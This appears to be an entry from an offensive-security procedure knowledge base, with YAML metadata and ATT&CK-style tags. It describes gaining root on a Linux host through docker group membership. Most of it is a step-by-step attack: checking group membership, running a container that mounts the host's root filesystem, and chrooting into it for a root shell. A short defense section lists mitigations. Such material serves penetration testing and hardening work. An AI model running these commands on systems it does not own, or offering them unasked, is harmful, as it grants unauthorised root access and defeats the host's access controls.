---
id: d96906be-8cd0-491f-8571-e56a7be8da6c
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T19:15:07.945476+00:00'
updated_at: '2023-05-26T00:47:41.916274+00:00'
tactics:
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
sub_techniques: []
tags:
  - hypervisors
  - known-vulnerability
  - misconfiguration
platforms:
  - Linux
commands:
  - '[[commands/Docker-Mount-Hosts-Root-Directory-in-Container]]'
tools:
  - '[[tools/Docker]]'
validated: true
---

# Docker-Privilege-Escalation-Using-Docker-Group

## Summary

Escalate to root on a Docker host if the user is in the docker group by running a privileged container that mounts the host root filesystem.

## Description

Docker group members can run containers as root, mounting host dirs. This bypasses host perms; common misconfig where non-admins get docker access.

## Requirements

1. Shell on host with docker group membership
2. Docker installed and running
3. Internet for image pull if needed

## Defense

- Never add non-root users to docker group
- Use user namespaces
- Run Docker with least priv

## Objectives

1. Confirm docker access
2. Mount host root
3. Gain root shell

## Instructions

### Step 1: Verify Docker Access

**Context**: Check group.

id | grep docker

### Step 2: Run Privileged Container

**Context**: Mount / to access host.

**Command** ([[commands/Docker-Mount-Hosts-Root-Directory-in-Container]]):
```bash
docker run -v /:/root_fs -i -t ubuntu bash
```

> Inside container, cd /root_fs; chroot /root_fs /bin/bash for root shell.
